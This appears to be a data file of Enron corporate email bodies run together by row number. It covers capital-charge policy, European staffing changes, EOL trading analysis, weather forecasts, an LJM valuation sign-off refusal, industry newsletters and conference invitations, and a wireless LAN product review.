The previous numbers used in the Business Plans at the beginning of this year will remain for all transactions in place and where we hold assets. Therefore, on any assets currently held within each business area, the capital charge will remain at 15%. Internal ownership of these assets will be maintained by the originating Business Unit subject to the Internal Ownership Policy outlined below.

The cost of capital associated with all transactions in Enron Americas will be set by Joe. This process is separate and apart from the current RAC process for transactions which will continue unchanged.

Capital investments on balance sheet will continue to accrue a capital charge at the previously established rate of 15%. Transactions which are structured off credit will receive a pure market pass through of the actually incurred cost of capital as opposed to the previous 15% across the board charge. Transactions which are structured off balance sheet, but on credit will be priced based upon the financial impact on Enron America's overall credit capacity.

On transactions that deploy capital through the trading books, the Capital Book will take a finance reserve on each transaction, similar to the way the Credit Group takes a credit reserve. This finance reserve will be used specifically to fund the capital required for the transaction. As noted above, the Capital Book will have no budget and will essentially charge out to the origination and trading groups at actual cost.

By sending market-based capital pricing signals internally, Enron America's sources of capital and liquidity should be better optimized across the organization.

2152,"Once the Arcos plant in Spain is financially closed (expected in Q2 of this 
year) Eric Gonzales will be moving back to Houston to work exclusively on 
co-managing Enron's LNG markets.   We are very appreciative of Eric's efforts 
in Europe since early 1998 and look forward to continuing to work very 
closely with his LNG team in the coming years.  From this point forward Eric 
will focus his remaining time in Europe exclusively on financially closing 
Arcos.

We are therefore making the following changes immediately.   The origination 
responsibility for Italy will be moved under  Eric Shaw.  Ricardo Bortolloti 
will continue in the role as Italian Country Manager and will report to Eric 
Shaw.   Mariano Gentilini will become our Country Manager for Spain and 
Portugal and will report directly to the Enron Europe Office of the Chairman.

The Arcos Power Project is likely to create a large gas to power spread 
position and so we have asked Paul Mead to assume the added responsibility 
for our natural gas risk positions in Spain.  This position is much more 
likely to be supplied and influenced by LNG rather than Continental Gas 
markets and Paul will  work quite closely with both Enron Global Markets and 
the Continental Gas team.

Ross Sankey who has been managing our marketing efforts in Holland will also 
head a new organization that will focus on subsea interconnector and power 
transmission opportunities across Europe.   Among the prospects his team will 
pursue include projects  from Norway to the UK,  Sweden to the Continent,  
and bidding on existing French interconnector capacity.   He will report  to 
Eric Shaw for the Holland markets and to Richard Lewis for the Transmission 
responsibilities.

Finally the Continental Gas team is interacting far more with our UK gas team 
than our power teams on the Continent.  Therefore David Galagher who manages 
our Continental Gas team  will now report directly to Richard Lewis.

We have aggressive income targets for this year and anticipate that  these 
changes will create the right links to optimize our performance.  Please help 
make these changes as smooth as possible.

I hope you had a wonderful vacation back home, and are rested and recovered 
from the long flight back.

I wanted to give you an update of the EOL project, the Gas Model, and of my 
intentions here at Enron.

Software (in compiled C on the Unix platform) has been developed and debugged 
to listen to the EOL trades, process them, book them, and file them away. In 
addition, software has been developed and debugged to mark these to market on 
a continual basis, and to store the entirety of open positions on EOL in a 
dynamic matrix facilitating analysis. IT has yet to get back with me on how 
the software can be informed of those trades ultimately rejected for credit 
purposes.

These data files are stored in a format for reading by Excel or by SAS, for 
which I have written the data step program and basic tabulation routines 
elucidating the structure of the data.

I am in the process of documenting all of this for you.

With regards the Gas Model and its slow performance on the Compaq, Dell has 
agreed to loan me one of their competing machines to the Compaq, to see if 
the performance issue of the LP is related to the Compaq. I have been 
researching this issue with IT here and with Compaq and Dell. The new machine 
will be here any day now (no financial obligation to anyone), and I will be 
able to immediately ascertain whether the problem the model is having is 
Compaq-specific.

I am also in the process of documenting the Gas Model for you.

I've tried to do my best for you, Vasant, but I have been frustrated by not 
only the death of my mother but some internal systems in IT here. Just the 
other day, SAS could not open a full query of the EOL database because there 
wasn't enough free space on the server's hard drive for the workfiles. In 
discussing some of these issues with some good friends of mine in power 
trading, people whom I have known for over 10 years, they indicated they were 
ubiquitous here. The power traders have similar PC's to my new one, and they 
have complained from Day 1 that theirs are slower than their old ones.  Also, 
there remains a large frustration with the development of data warehouses; 
during my brief tenure here IT has gone through two differing proposals as to 
how to address this. When I have been told of tools available for real-time 
data harvesting, my requests for such have typically been met with ""well, we 
have it, but we haven't really tested it yet."" An example is the weather: we 
still do not record to disk the hourly NWS observations from the GOES 
satellite.

My interests here are to help Enron to do well, because I will do well only 
if Enron does well. These aren't empty words- my IRA is 100% invested in the 
Enron stock fund. I believe my best contributions to Enron will be in the 
areas of systems as well as modeling, and the difficulty working in the 
Research Group, in terms of systems development, is that, frankly, few people 
at Enron seem to care what a researcher thinks about our systems. We aren't 
directly generating revenues for Enron, and we aren't really their customers, 
except in our relatively small deparrtmental infrastructure expenses.

As it happens, Power Trading posted an opening for a Modeling and Forecasting 
person, and I spoke with them and they asked me to take the job, reporting to 
George Hopley. It is a wonderful opportunity for me, Vasant, as they are 
interested in large system modelng of power grids as well as improving their 
traders' access to real-time fundamentals data. I was completely candid with 
Kevin Presto regarding my shortcomings here in Research- I told him you were 
disgusted with me because I repeatedly failed to meet time deadlines. They 
also understand I have yet to be at Enron for 1 year, and thus may only bid 
on a job with your permission. We agree the move is good for Enron; we all 
work for Enron, and your acquiescence to the move does not endorse it but 
merely permit it. They are comfortable with me- they have known me for years 
as a hard worker, honest and unpretensive. They have already ordered a 
state-of-the-art Unix workstation and server for me, and they have told me 
they will commit whatever resources are necessary for me to be successful, 
including hiring an Analyst to work for me. And, I have already been able to 
teach their analysts improved techniques for data harvesting and analysis I 
have learned here.

So, I am requesting your permission to bid for this job opening. It would be 
a lateral move in position and salary, and I would commit to you to help you 
in any way possible in the future with regards the Gas Model or the EOL 
database. I will continue to work on their improvement, and complete their 
documentation.

As it happens, I am away on Enron business in Portland Monday and Tuesday, 
and will be back Wednesday. I had wanted to talk face-to-face instead of by 
email, but Enron business supercedes- I am on a team designing the data 
warehouse for floor trader support.

some comments :
1.  You request Enron position after successful market order, but not after 
limit order  -- you may want it after limit order as well to be consistent.  
I am not clear on how you would use Enron position.  It is possible that the 
trading desk will have a target position in mind and they will set bids and 
offers in such a way as to try to achieve that target position, but this 
target position probably changes continuously and is not stored anywhere, and 
without this target position there is nothing to compare actual Enron 
position to.  Of course, Enron position may still provide some insights.

Here are four graphs I came up with yesterday afternoon that may be of 
interest:

The first one shows what percentage of our trades are done with different 
counterparties -



(Note the large part that Aquila plays!)

The other three graphs look at how trading volume varies during the week 
between the hours of 8:00 AM and 4:00 PM for different categories of product. 
Natural gas and power have their own graphs, as they have the largest traded 
volumes. ""Products"" is for the remaining categories.



There are still some things I would like to take a look at. The databeacon 
software is now available, and can be reached at the following URL:

Do you have any specific questions that you would like me to try answering 
regarding EOL?

I have also started doing some research on automated trading platforms. Are 
there any websites and/or papers you would recommend I read?

Dharan will discuss various issues and address these questions: Were there red flags? Could we have spotted problems last year?

2193,"Good Morning! 
Bottom line: No Changes - Overall US conditions will return to a more normal late fall/early winter pattern (no Arctic air) over the next 2 days. This pattern will persist through the end of the month. 
For the near term (1-5): Bottom Line - Cooler weather will bring temperatures below normal from the beginning through the middle of the week in the Midwest and from the middle through the end of the week in the East and South. The below normal event will last 3 to 4 days before normal temperatures return. The Rockies and West will be normal to above normal with cooling by the end of the week.
Details: We see some cool anomalies arriving into the Midwest tomorrow, with temperatures in Chicago reaching highs late tonight and the mercury falling through the day tomorrow. By Tuesday, the South and Texas will be in the below normal category, with Dallas overnights in the mid-30s (normal low 43), Houston's low 40s (normal upper-40s) and Chicago will freeze, with a mid-20 overnight. Progressing into the Northeast by wednesday, Philly and New York will get into the below normal category, but 5 or 6 degree anomalies are most likely. Looks like a three day event as it moves easterly and then is followed by moderation.
6-10 Day Bottom Line: Variable conditions continue with a stormy pattern entrenched over much of the nation. Overall temperatures will be normal to cool with very wet conditions. NO strong Arctic air is expected.
Details: A strong storm will push into the West late next week and next weekend bringing heavy rain and snow and temperatures near to below normal. At the same time - the Midwest will warm toward normal with wet conditions developing. By early in the last week of November the strong western storm will push into the central U.S. bringing widespread rain and snow. Behind the system another surge of below normal temperatures will track from the Midwest to the South to the East.
11-15 Day a generally cool and wet weather pattern will persist over much of the nation. While NO Arctic air is clear on the horizon - temperatures on a national average will be cooler than normal and there will be an increased threat for rain and snow. 
So, with normals dropping across the nation, this first cool air anomaly event arriving in the Midwest by Tuesday will elevate the nation's gas demand requirements into the 60 Bcf/d plus regime from here on through the winter. Here's the strip beginning with today:

	Join a unique blend of legal, regulatory, financial, RTO/ISO, utility, private and technical experts at Infocast's Transmission Summit 2002. Highly interactive panels will discuss the impacts of the unprecedented transmission policy changes, looking for ways to unlock the potential for value creation in the ""independent transmission business.""

 January 29, 2002	 January 30-31, 2002	
This executive forum goes beyond the public policy pronouncements to confront the tough, practical issues of implementation. It will bring together executives from some of the few transmission-owning organizations and their bankers and consultants that have come to grips with these issues over many months prior to the December 15 deadline. They will identify solutions and discuss the best ways to proceed in the near- to mid-term.	In 2002 owners, grid operators, system users, and investors will be forced to make sense of the multitude of changes affecting transmission business. To chart a course toward value creation for transmission assets while steering around the rocky shores of these regulatory changes it will also be important to understand the sometimes conflicting agendas of FERC and state regulators.

Today's focus: Lots on tap at Linux World 2002

By Phil Hochmuth

While Linux World Expo in New York next week will be the first
of a myriad of Linux events in 2002, it could become the year's
biggest Linux gig.

Keynote names at a conference are always a good sign of its
importance, and this year's New York Linuxfest has drawn the
likes of Hewlett-Packard CEO Carly Fiorina, and Computer
Associates CEO Sanjay Kumar. The show will also be the launch
pad for many Linux announcements (and a source for endless free
stuff).

On the hardware front, HP is expected to announce new Linux
products in the telecommunications area, while AMD will outline
its plans for Linux on its 64-bit processor architecture.
Server-related announcements will also be on hand from Compaq,
IBM and Dell, among others.

Geodesic, a maker of application management software, is
expected to launch a new software suite for Linux that can
monitor, fix and report on errors in an application running on
enterprise Linux servers.

Serena Software will announce a version of its ChangeMan DS
product for Linux on the IBM S/390 mainframe, which can be used
to manage the development and deployment of applications on a
mainframe in an enterprise. Also showing management wares will
be Aduva, which makes applications for automating the
installation process of Linux servers and workstations.

King of the Linux applications announcements will be Computer
Associates, which will launch 22 software products for Linux
including Linux server management tools, plus security and
software for managing Linux in mixed network environments.

2206,"Vince, I hope this e-mail finds you well.

The recent award of the Nobel Prize in Economics to Stiglitz, Spence and Akerlof  has set me thinking. Lots of what Enron does addresses asymmetrical markets by improving information. Is it a stretch to apply their theories to energy? Do our risk management tools help equalize the amount of information in the marketplace?

For example, Stiglitz says that insurance deductibles is the way that insurance carriers get customers to reveal their potential liability. Someone who is more likely to be in poor health or have accidents will seek lower deductibles. Do any of Enron's products help us, or the energy markets, reveal information that creates not only a more effective market but a market that works? 

If there is something substantial to this, I'd like to write about the subject for Exchange, the wholesale customer magazine. If it is just an interesting observation (that's true), perhaps we'd run it in eBiz.

Please take care,

PLEASE READ THIS IMPORTANT INFORMATION CONCERNING THE ENRON STOCK FUND IN THE ENRON CORP. SAVINGS AND ESOP PLANS

On Friday, January 11, trading of Enron stock was suspended on the New York Stock Exchange (NYSE).  All Savings and ESOP Plan transactions, including 401(k) payroll contributions,  involving this fund were placed in a pending status until trading resumed.

As announced by Enron's Office of the Chair on Wednesday, January 16, Enron stock would now be traded Over The Counter (OTC).  Upon receiving this information, work began immediately to develop a process that allows for OTC trades in the plans.

On Thursday, January 17, Enron initiated a process to facilitate OTC trades of Enron stock inside the 401(k) and ESOP and all pending transactions were processed using Thursday's closing price.  

Now that trading has resumed, we urge you to review your investment elections to ensure that they are consistent with your investment goals.  

As things change, we will continue to update you.

WEEKLY REVIEW
http://email.eRisks.com/cgi-bin10/flo?y=eLp10BHCKe0CjE0OVQ0Ar
This week&#8217;s economic, banking and P&C insurance news from an enterprise risk management perspective: anthrax fears loom over markets; mixed news on corporate earnings; US banks report third-quarter results; Fed governor speaks out on Basle responses; US insurance regulators scrutinise Lloyd&#8217;s solvency; White House releases proposals on terror cover.

ANALYSIS
http://email.eRisks.com/cgi-bin10/flo?y=eLp10BHCKe0CjE0B4V0AB
The $1 trillion credit derivatives market has been through a testing time recently. The bankruptcies of Swissair and the UK's Railtrack &#8211; both companies with actively traded default swaps &#8211; have focused attention on the efficiency of the market. So far, things seem to be working fine. But concerns are growing about some of the issues surrounding coverage for convertible bonds. In this week's banking analysis, ERisk's Duncan Woods investigates.

FEATURE
http://email.eRisks.com/cgi-bin10/flo?y=eLp10BHCKe0CjE0Ogf0AV
How to get credit systems up to scratch will be the big issue in banking in 2002, and the same problem is already occupying many energy risk practitioners. But why are some credit system projects successful, while others fail? And are software vendors the providers of a 'solution' or purveyors of hot air? In this exclusive ERisk feature, Karl Sees, principal at CreditRisk Advisers, sounds out banking and energy practitioners on the ingredients for a successful project.

RESEARCH ARCHIVE
http://email.eRisks.com/cgi-bin10/flo?y=eLp10BHCKe0CjE0Car0AP
It's time to get serious about credit risk modelling, so we've added more links to recent papers to the Credit Risk section of our Research Archive. You'll find new work on modelling sovereign default, high-yield debt, default model verification, a recent reprise of the KMV approach to default modelling and more. We're also adding papers on business risk, market risk and ERM - so visit the Archive to check these topics out soon.

Risk Assessment and Porfolio Optimisation for Oil and Gas, 23rd-24th
October, Holiday Inn, Victoria, London

I am producing the above conference and have been speaking with both Ron
Bain from Anadarko Petroleum and Soussan Faiz from Texaco who recommended
that I contact you. I understand that you have a wealth of experience in
real options and that this is an area that Enron is extremely committed to.
I would love to invite you to come along and speak as I think that you would
make a vital addition to the programme. Your colleague Shirley recommended
that I email some details over first of all - I hope you don't mind.

I have drawn up a draft programme (attached below) based on my research, but
please do bear in mind that this is very much a developing programme and if
you have any comments I'd really like to hear them. Also if you feel that
you would like to present an area that I have not covered in the programme
or would like me to rewrite a session I would be more than happy to do so.

I know that you are extremely busy and must get approached regularly to
speak at conferences, however I really do believe that this will be a
fantastic opportunity to publicise Enron as a leader across Europe. We will
be marketing this conference to over 40,000 targeted individuals, including
a direct mail of at least 25,000 and in addition an online and press
campaign.  We will be looking to work with leading industry press such as
Petroleum Review, Oil and Gas Journal, Offshore Magazine and Harts E&P and
can also undertake mailings for our speakers and sponsors to their contacts
and clients.

Just to let you know of my deadlines, I am working to a very tight deadline
and will need confirmation by Thursday 14th June if you are interested in
getting more involved in this programme.  I appreciate that this is very
short notice, but at this stage I would need very little from you.  You
would simply need to choose an appropriate session or I can adapt a short
abstract for you and I can co-ordinate with your assistant to get a
biography for the brochure.

I look forward to hearing from you soon and sincerely hope that you can make
it.

Title: Energy Liberalization in Europe--A New Concern for Security of Supply
URL(s):

http://www20.cera.com/eprofile?u=35&m=2755;


***********************************************************************

SECURITY OF ENERGY SUPPLY BACK ON THE EUROPEAN POLITICAL AGENDA

The tragic events of September 11 brought a new dimension to the general
question of security--clearly energy facilities could be targets for terrorist
attacks. Even before the attacks, high world oil prices and the euro's
depreciation put energy security of supply back on the European political
agenda, together with the awareness of dependence on imports, and the risk of
economic and even physical disruption in energy supply, including natural
disruptions from storms or flooding.

*  Security of supply, under its different forms, has returned as a political
concern across the European Union.

*  The new liberalized environment should, at least partly, mitigate security
supply risks.

*  Long-term risks remain a matter of discussion, with concern that market
mechanisms provide the right signals, such as adequate investment made at the
right time.

GENERATOR/POWER MARKETING  FERC Agenda Memo for October 24, 2001
 
Introduction
RTO Week shedded a new light on the pace and direction that  the Commission may go in with respect to RTO development. During discussions  with the state commission representatives on Thursday, Chairman Wood said with  regards to the hard and fast number of RTOs he desired,  ""the  number 4 is officially gone.. if it ever was essentially here.""   Chairman Wood  was very receptive to the recommendations and pleas of  the state commissioners and declared that the FERC would take as much time as it  needed and that it was ""committed to getting the right outcome.""  With that  being said, 5 of the RTO-related proceedings on the agenda for next week's  FERC meeting will probably result in extensive discussions encapsulating this  week's RTO Week developments and a retreat from a prescriptive order or  rulemaking issuing at this time. 
 
Commission Agenda: http://www.ferc.fed.us/PUBLIC/ISD/Sunshine.htm 
 
If you would like copies of any orders, please do not hesitate to  contact us. Below are individual case descriptions. 
 
 
In addition, the Commission will discuss four new  ""Administrative"" issues:
A-4  AD02-4  Reliability, Security and  Market Operations
A-2  AD02-2 Legislative  Matters
A-3  AD02-3  Customer  Matters
A-1  AD02-1  Agency Administrative  Matters
 
 
RTO Developments
 
E-1  Discussion of RTO Developments in the  Northeast EX02-1-000; RT01-99 PJM; RT01-98 PJM-West; New York ISO  RT01-95;  Commission discussion on the FERC's ALJ Northeast  RTO Mediation Report and comments filed by industry.  
E-2 Discussion of RTO Developments in the  Southeast  EX02-2; RT01-100 Gridsouth; RT01-34 Southwest Power Pool;  RT01-75 Entergy Services; RT01-77 Southern Company Services -   Commission discussion on the FERC's ALJ Southeast RTO Mediation  Report and comments filed by industry.  
 
E-3  Discussion of RTO Developments In the Midwest EX02-3; RT01-87  Midwest ISO/Alliance; EL01-80 National Grid USA - Commission  discussion on RTO developments in the Midwest region.  At the last  Commission meeting, FERC gave the Midwest ISO a big boost toward the RTO finish  line. The discussions with state commissions at this week's RTO week conference  may slow down FERC's efforts in mandating RTO structure in the Midwest also.  
 
E-4  Discussion of Western Infrastructure  Adequacy Conference  AD01-2 - Commission discussion on  FERC's agenda and scope of the  ""Adequacy of Western Infrastructure""  conference announced at the September 26 Commission meeting and to be held  during the Western Governor's Association's meeting on November 2 in Seattle,  WA. 
 
E-5  Electricity Market Design and Structure  RM01-12 -  Commission action in response to RTO Week  developments and comments filed in the ""Electricity Market Design Structure""  docket. 
 
 
Market Complaints
E-19  San Diego Gas & Electric Co. v.  Sellers of Energy  EL00-95-034; EL00-98-038 -  Order on  the CA ISO's compliance filing proposing a new generator outage and maintenance  coordination plan.  Dynegy and other protesters allege that the CA ISO  is attempting to circumvent FERC and ""seize control of the outage  monitoring"" function that is currently FERC' s responsibility and  role.   
 
E-21  Pacificorp Power Marketing ER01-2685-000  - Order on Pacificorp Power Marketing's request to withdraw its  filing of a 10-year power Purchasing Agreement contract with the California  Department of Water Resources. Attempting to comply with a Commission order  in the Southern Case rescinding waiver and requiring that  all  long-tern power contacts be filed with the Commission in  place of submitting quarterly power marketing reports, Pacificorp  filed its long-term contract and later realized that the waiver was still in  effect at the time it made the power contract filing.  As a  result, Pacifcorp filed to withdraw its earlier contract filing. The California  Public Utilities Commission filed protest to the  withdrawal.  
 
E-26  Mirant et al.  v. ISO New England,  Inc.  EL01-93-001 -  Order on NSTAR's request for  rehearing of the Commission's 8/10/01 order upholding the ISO NE's market rules,  which include Market Rule No. 17 affording the ISO NE discretion to negotiate  mitigation agreements and enter into market power mitigation contracts with  generators.  In response to the rehearing request, the ISO  NE filed for clarification of this exemption to file mitigation agreements  with the FERC, under its discretion granted per the approved market  rules.  
 
E-30  Calpine Eastern Corp., Mirant et al. v.  ISO New England  EL01-124-000 - Order on Calpine's complaint  against the ISO NE for excluding external energy contracts from its calculation  of the energy clearing price for the ISO's market.

I have informed Ryan Siurek (cc Rick Buy) on Oct 4
that I cannot sign off on any analysis
done by our group without looking at full set of
legal documents related to the LJM
transactions. Those documents were not provided and therefore
we cannot sign off on any analysis done in the past.

I have come to a conclusion that we cannot support
the valuations based on verbal and
often conflicting information, without doing  full due
diligence.

Feel free to provide the information to Kimberly but,
please, inform her I cannot support the quantitative analysis
we have done in the past. I am especially concerned about the conflict between
the existence of the restriction and the existence of a put that are, in my view,
mutually exclusive.

I will meet with Tiko today to discuss our move on Nov. 9th,
                 

Please note : File space is very limited , we must be prepared.

We will also have our last tour before moving on Nov.6th and we
will actually see our new location.

I am also working with Reggie Wilson to see if maybe we 
can have a shelf or any other type furniture built to allow
us storage space for files papers etc.....

Printers, copiers and other equipment is really not
a great concern at the moment because we are working
to be sure this will be operational.

All supplies are packed and ready for moving , we have a very limited
amount  in the supplies closet , if you need something and you
do not see it - please do not hesitate to ask.

2235,"Dear Vince,
Thank you for sparing some time to talk with me about the opportunities at
Enron.
As a Computational Finance student with a chemical engineering background, I
am very interested in pursuing my career with Enron as this will give me the
opportunity to employ the skills that I have developed during the course of
my education and experience. I am currently working on an external project
with Professor John O'Brien, on the Effect of Convexity on pricing
Eurodollar swaps and I am confident that this experience would help me in
understanding the effects of volatility on derivative prices, which is a
fundamental component in the energy markets. Also, I am currently doing a
project on assessing the intrinsic value of Enron and its business-operating
environment to augment my knowledge of Enron in particular and the energy
markets in general. My education, as well as my experiences have helped in
honing my quantitative, analytical and computing skills, and have given me a
significant insight into the global trading industry.

I am enclosing my resume along with this mail. As mentioned in our
conversation, I would like to pursue a career in Energy trading and
research.

Hoping to hear from you soon.

		What's New at ERisk.com - 26 October 2001	


Weekly Review	In  this week's round-up   of economic, banking and P?insurance news from an enterprise risk management  perspective: US markets rise above gloomy economic data; European bank investors nervously await results; Merrill goes back to the drawing board; Swiss Re goes on the offensive over WTC payout; Lloyd's of London confirms massive exposure to US terror claims. 	
		
		
Analysis 	 The  financial implications of the events of September 11 are still being digested  by the P?insurance industry. One possible consequence could be a  greater focus on enterprise risk management (ERM), which would allow insurers  and reinsurers to take a more holistic view of their exposures. But, as  we discover in this week's analysis,   the experience of the industry to date suggests that ERM is still not  widely practised, and many obstacles to its implementation remain.  	
Feature	Business  risks that were once thought unavoidable and unmeasurable are slowly becoming  ""manageable"" using the tools of risk transfer. One result of this  is that some senior risk managers are moving beyond their traditional role  as watchdogs to contribute to strategic decision making in a variety of  businesses. In this feature ,  which complements our Business  Risk Jigsaw , ERisk editor-in-chief Sumit Paul-Choudhury asks whether  strategic risk management will be redefined by developments such as alternative  risk transfer, weather derivatives and real options analysis.	
Viewpoint	FleetBoston  entered the upper echelons of the US banking sector when Fleet Bank and  BankBoston merged in 1999. In our latest CRO  Profile , we talk to Paul Hogan, chief risk officer at the $200 billion-asset  company, about FleetBoston's risk management initiatives, the challenge  of managing credit risk in a slowing economy and the changing role of the  risk manager.	
Job Listings	A number of new positions  are currently being advertised in our Job  Listings  section. These include vacancies for a senior risk management  analyst, a director of operational risk and a head of credit risk. Whether  you are recruiting to fill a risk management post or looking for a new position  yourself, ERisk's job listings page is rapidly becoming one of the industry's  premier resources.

2258,"With Ken Lay's resignation, you undoubtedly have questions about Enron's management structure and what lies ahead for the company.  The purpose of this communication is to begin to answer those questions and lay out the direction we plan to follow as we regroup and rebuild.

First, the Creditors Committee has proposed that the Board of Directors retain an interim CEO to focus on the restructuring process.  This is a positive sign that the Committee believes Enron will provide greater value as a viable ongoing business.

The Enron Board of Directors has approved Stephen Cooper as interim CEO and chief restructuring officer.  Steve is the managing partner of Zolfo Cooper, a corporate recovery and crisis management firm with more than 30 years experience leading companies through operational and financial reorganizations.

Steve and his firm will work with members of Enron's current management to develop and implement a comprehensive plan to restructure the company and emerge from bankruptcy.  

As you know, Enron has entered into an agreement with UBS Warburg for the sale of NetCo, Enron's wholesale gas and power trading organization.  In preparation for the transition of NetCo to UBS, Greg Whalley has resigned as president and COO of Enron to assume a position with UBS Warburg.  We want to thank Greg and the NetCo employees joining UBS for their contributions to Enron and wish them great success going forward.

In addition to engaging Steve, Enron has formed an Office of the Chief Executive.  I will join Steve in that office as president and chief operating officer, and Ray Bowen will join us as executive vice president and chief financial officer.

We will provide additional information regarding the roles and responsibilities of Enron's entire management team once those become more fully defined.

Thank you for continuing to support Enron by performing your job everyday.  The ongoing uncertainty about our future, coupled with the constant media scrutiny, makes this situation difficult for all of us. While no one can control the media, we can and will define our leadership and devise our strategy for moving ahead.  And in doing so, we will build a more certain future for our company and our employees.

The risk section received some pretty good marks. I don't know what your plans are going foreward, but I would like to keep the communication open. I've been playing around with a few concepts for special sections in the Risk Desk -- tossed around the ideas to a few big fivers, CRO's and the like, guys like Pokalsky and so on. The publication is growing pretty steadily so I think some kind of relationship between the two of us might be good for all involved. Anyhow, would like to discuss the details sometime soon-- what's good for you?

FERC Gives OK to North BajaPipeline
Jan. 16 -- The Federal Energy Regulatory Commission gave final approval on Wednesday to the U.S.segment of the North Baja Pipeline project that will bring natural gas from Mexicoto fuel electric generating plants in southern Californiaand northern Mexico. The $230 million pipeline will be operated by an international subsidiary of Sempra Energy , PG&E Corp. and Mexico-based Proxima Gas S.A. de C.V. The 215-mile pipeline (346-km) would carry up to 500 million cubic feet of natural gas per day. FERC gave final approval for the project after determining the pipeline would not harm the environment.

From the AnchorageDaily News:
 
Universityof HoustonStudy Favors Phased Development of Northern Frontier Gas
An energy consultant who grew up in Alaska believes the least risky way to tap the North Slope's huge natural gas reserves is to do so in stages, running multiple pipelines across the Canadian Arctic during the next 16 years. 
Ron Oligney, director of engineering research development at the Universityof Houston, said Tuesday that smaller pipelines built every few years would reduce the huge costs and risks that would come with a single, larger pipeline to the Lower 48. 
He and colleague Jim Longbottom of the Universityof Houstonrecently completed a study on Alaskaand northwest Canadagas development. The university and private clients paid for the study, he said. On Tuesday, Oligney presented the findings to members of the Society of Petroleum Engineers and the International Association of Energy Economics at the AtwoodBuildingin downtown Anchorage.

Today's focus: We have the answers

By Dave Kearns

Last week's Network World included an opinion piece titled
""Finding grief instead of answers"" by Shari Loback. In general,
it was about all vendors' online tech support, but she led
with a diatribe about Novell's online support forums that
included both inaccurate and misleading information.

Loback - who holds MCSE, CNE and CCNA certifications - is a
network engineer at InPro and formed her impressions of
Novell's online forums after using only the Web-based front-
end. Most veterans of that forum, as well as other support
venues, will tell you that using the network news interface is
much easier to read and follow.

She's also mistaken in ""recalling"" that Novell's forums
""...provided timely, helpful responses from Novell technicians
who seemed to have a solid grasp of the products."" In fact,
Novell's support forums haven't been staffed by Novell
employees in almost 15 years - since the very early days of
NetWire on Compuserve.

The forums at http://support.novell.com/forums/ have always
been staffed by volunteers - a motley, but knowledgeable, group
of dedicated professionals formerly called the ""NetWare SysOps""
and then later called the ""Novell Support Connection Volunteers.""
The group is now officially known as ""Novell Technical Support
Volunteer SysOps"" (but only by one or two people at Novell).

The volunteers form an eclectic group of individuals with
experience in almost all areas of networking. Most importantly,
these folks actually use the products they are supporting -
they aren't just recent college grads reading an infobase.
Check the sysops' bios at
http://support.novell.com/forums/sysop_info.html and you'll
find a fascinating group whose members are scattered around the
world. While often disagreeing with each other about most
things, these folks are united by their desire to deliver the
most accurate and complete support information to the many
users of the forums.

Loback does make some good points. There is no longer a
""search"" function for the Web interface (one is being
developed, but is not yet available. Until then, you can use
Google Groups (http://groups.google.com/ ) to search the forums.

Threading of messages also leaves a lot to be desired when
viewed through the Web interface, which can make it difficult
for you to know when a reply to your question has been posted.
But if you are only an occasional user, searching at
http://groups.google.com/advanced_group_search?hl=en using your
own name as the author quickly returns your original question
as well as any responses. Even better, use a newsreader (like
those built into Internet Explorer or Netscape) and have all of
the messages properly threaded for you.

Novell's Support Connection forums are a great buy (they're
free) and provide great information as well as accurate (i.e.,
no marketing allowed!) support. The volunteers aren't afraid to
suggest non-Novell solutions where appropriate. If you aren't
using these forums, then you aren't providing the best support
for your network.

Disclaimer: Dave Kearns was a founding sysop of NetWire on
Compuserve and still volunteers his time to help out on the
Novell Support Connection forums.

Editor's corrections: Lindsey Johnstone works for the City of
Seattle, not Novell and it is the city of Brampton in Ontario
that has bought into ZenWorks for Desktops (see last week's
""Novell picked for massive e-government project"").

Attached are the registration form and  agenda for Friday's January 31 industry meeting in New York City. This  meeting is a  continuation of Monday's Jan 28 industry  collaborative at DOE to develop a ""single"" consensus standards setting  organization by March 15, as directed by FERC. Provided below is the  matrix developed by industry at Monday's meeting identifying  the areas of similarities and differences between the various models and  proposals. We look for you to review the matrix internally and be prepared to  advance the discussion and start making the hard decisions in New  York.

One day Father Boudreaux and Pastor Thibodeaux wus fishin on the side
of dey road. Dey thoughtfully made a sign saying:

                   ""The End is Near, Cher' !
                    Turn yurself 'Round now,
                    before it's too late!,""

and showed it to each passing car.

Well dis one car dat passed didn't appreciate the sign and wus shouting
at dem and hollin ""Leave us alone, you religious nuts!""

Den all of a sudden dey heard a big splash and dey looked at each other
and Fr. Boudreaux said .....
""ya think we shoulda just put a sign dat says  'Bridge Out' instead?""

Title: India-Pakistan War? Risks and Implications
URL(s):

http://www.cera.com/eprofile?u=35&m=2923;


***********************************************************************

INDIA-PAKISTAN WAR? RISKS AND IMPLICATIONS

Prospects are growing that a short, sharp war could occur between India and
Pakistan over the next several weeks. It is not inevitable; diplomacy could
still pull the two parties back.

*  Such a war--if it does occur--need not prompt doomsday predictions or
excessive global concern so long as both countries see short-term political
advantages accruing from a tightly contained conflict.

*  It would have a complicating but manageable impact on the American-led
counterterrorism effort in south and central Asia.

*  A very limited-duration conflict could even lead to intensive multilateral
efforts to solve the Kashmir dispute, the central dispute between India and
Pakistan.

Today's focus: Wireless LAN security, Part 2

By Neal Weinberg

In our review of wireless LAN security solutions, we tested
3Com's Access Point 6000, Avaya's Access Server 1, Cisco's
Aironet 350 access point and Access Control Server, and
Colubris' CN1000. Last time, we looked at the Cisco and
Colubris products. This time, we check out 3Com's and Avaya's
wares.

3Com's Access Point 6000 is a well-designed product. It
features a two-position wireless access point with a flip
antenna as well as a retractable X-Jack antenna on its wireless
network interface card (NIC). The X-Jack lets you store the
antenna in the NIC when not in use, keeping it in your laptop
during transportation.

3Com's Dynamic Security Link technology is similar to Cisco's
Lightweight Extensive Authentication Protocol (LEAP). One
benefit of Dynamic Security Link is that it increases the
number of simultaneous users from 65 to 255.

Furthermore, you don't have to manually enter the 128-bit keys.
The software automatically generates new keys and distributes
them to the client each session. This is great for encryption,
but you still need to provide for authentication.

It took only 60 seconds to set up the access point, but
implementing the full range of security took a while longer.
3Com's browser-based Configuration Management System was
excellent, and the HTML-based documentation was complete and
well organized. In all, 3Com's product had some neat
technology.

Avaya's wireless NIC looked familiar and that's because it was.
It seems that both Colubris and Avaya use NICs from Orinoco.
But Avaya's solution goes far beyond just the NIC.

Avaya's Access Server 1 is a slick tool for managing corporate-
level wireless security. It includes Remote Authentication Dial
In User Server software that runs on any workstation plugged
into the hard-wired LAN. And it employs automatic key
generation and distribution.

Avaya's documentation was very good, with plenty of room set
aside in the form of tables to record the system parameters
administrators in large corporate environments should never
commit to memory.

The Access Server manager provides the full range of management
and diagnostic utilities you'd expect from a top-of-the-line
corporate offering.

